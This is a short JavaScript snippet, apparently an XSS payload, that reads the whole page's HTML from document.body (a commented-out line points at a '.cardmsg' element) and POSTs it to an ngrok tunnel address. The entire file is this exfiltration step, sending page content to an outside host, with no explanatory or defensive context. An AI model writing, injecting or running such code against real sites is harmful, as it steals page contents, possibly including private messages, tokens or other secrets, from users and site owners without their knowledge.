const cardmsg = document.body;//document.querySelector('.cardmsg');
const data = cardmsg.innerHTML;

fetch('https://6aac-197-218-61-14.in.ngrok.io', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: `data=${encodeURIComponent(data)}`
})
.then(response => {
  // handle the response
})
.catch(error => {
  // handle the error
});

